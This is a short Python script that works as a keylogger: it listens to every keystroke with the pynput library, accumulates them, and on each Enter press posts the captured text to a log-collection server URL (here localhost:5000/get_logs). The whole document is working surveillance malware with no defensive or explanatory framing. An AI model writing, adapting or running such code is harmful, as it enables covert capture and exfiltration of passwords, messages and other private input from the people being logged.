from pynput.keyboard import Listener, Key
import requests

server_url = 'http://localhost:5000/get_logs' 
logs = ''

def on_press(key) :
    global logs

    if key == Key.enter:
        requests.post(server_url, data={'logs': logs})
        logs = ''
    else :
        logs += str(key).replace("'", "")

with Listener(on_press=on_press) as listener:
    listener.join()